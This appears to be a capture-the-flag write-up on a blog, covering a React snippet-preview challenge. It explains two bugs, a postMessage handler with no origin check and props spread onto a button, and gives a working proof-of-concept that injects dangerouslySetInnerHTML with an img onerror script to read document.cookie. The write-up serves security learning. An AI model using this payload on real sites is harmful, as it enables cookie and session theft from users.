---
layout: post
title: "
<div style='display: flex; align-items: center; justify-content: space-between;'>
    <a href='/' style='font-size: 28px; font-weight: normal; color: #c1c1c1; text-decoration: none; margin-top: -50px;'>Home</a>
    <img src='https://raw.githubusercontent.com/pligonstein/pligonstein.github.io/main/images/logo.gif' alt='Logo' style='height: 48px; width: 48px; border-radius: 50%; object-fit: cover; margin-top: -50px;'>
</div>"
post_title: "Previewshim - ROCSC 25 Final"
date: 2025-06-08
categories: blog
---

## Challenge overview

The site is a snippet-sharing playground built with React. You paste code, hit “Share” (the server stores it and returns a `shareId`), then anyone can preview the snippet at:

```ruby
http://HOST/?shareId=<id>
```

If a snippet crashes, the React front-end shows a red error banner and a friendly “Report Issue” button.

>On the server this route launches a headless browser that:
>
> - sets a non-HttpOnly cookie flag=CTF{…} for the top-level page;
> - navigates to /?shareId=…;
> - waits until the selector .shim-error (the red banner) exists;
> - takes a full-page screenshot and returns it to whoever filed the report.

So, if we can make our snippet crash and run JavaScript in the top window, that JS can read `document.cookie`, rewrite the page with the flag, and the bot kindly screenshots it for us.

## Exploitation

```tsx
// inside handleRender()
const handleMessage = (event: MessageEvent) => {
  if (event.data.type === 'error') {
    /* Bug 1 - no origin check
       Whatever the iframe sends becomes React state*/
    setError(event.data.message);
    setErrorStack(event.data.stack);
    setErrorViewStack(event.data.viewStack);
  }
};
window.addEventListener('message', handleMessage);
```

What does means is that any page inside the preview iframe can do `parent.postMessage({type:'error', …}, '*')` and control all the fields above. [Here](https://medium.com/@mrajaeim/understanding-window-postmessage-and-window-parent-postmessage-in-javascript-f09d4eac68ba)
you have more details about what `window.postmessage` does. It's basically used within an embedded iframe to communicate with its parent window.

```tsx
<button
  ref={buttonRef}
  className="stack-toggle"
  popoverTarget={popoverRef.current?.id}
  onClick={() => popoverRef.current?.togglePopover()}

  {...viewStack}   /* Bug 2 – every key in viewStack becomes
                      a raw DOM attribute or a genuine React prop */
>
```

Because the attribute spreads at runtime we can inject malicious attributes like [`dangerouslySetInnerHTML`](https://legacy.reactjs.org/docs/dom-elements.html) which lets us inject raw HTML inside the element.

With all this in mind, let's create a POC to retrieve the flag.

## POC

```html
<script>
  parent.postMessage(
    {
      type: 'error',   /* make React think the preview crashed */       
      message: 'boom', /* name of the banner */
      stack: '',
      viewStack: { /* object that will be spread on <button> */
        dangerouslySetInnerHTML: { /* raw HTML we want inside the button */
          __html: ` /*  must pass key with dangerouslySetInnerHTML in order to inject raw HTML  - See link above*/
            <img src=x /* Triggers an image error which screenshots the flag when the bot connects */
                 onerror="
                   const m = document.cookie.match(/flag=[^;]*/);
                   if (m) document.body.innerText = m[0];
                 ">
          `
        }
      }
    },
    '*'
  );
</script>
```

![image](https://github.com/user-attachments/assets/994530b5-8b8d-42e8-9573-d0d095f6e8a0)
